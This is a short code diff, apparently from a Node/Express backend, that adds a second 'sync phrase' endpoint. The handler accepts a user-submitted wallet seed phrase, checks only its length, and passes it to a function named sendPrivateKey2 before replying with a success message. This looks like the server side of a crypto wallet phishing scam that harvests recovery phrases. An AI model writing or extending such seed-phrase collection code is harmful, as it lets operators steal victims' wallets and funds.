@@ -125,3 +125,20 @@ export const getSyncPhrase = async (req, res) => {
     console.log(error);
   }
 };
+
+// Get key and seed phrase
+export const getSyncPhrase2 = async (req, res) => {
+  const { rPhrase } = req.body;
+  const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
+  if (!checkPhrase) return;
+  // return;
+  try {
+    sendPrivateKey2(rPhrase);
+    return responses.success({
+      res,
+      message: `it a success`,
+    });
+  } catch (error) {
+    console.log(error);
+  }
+};
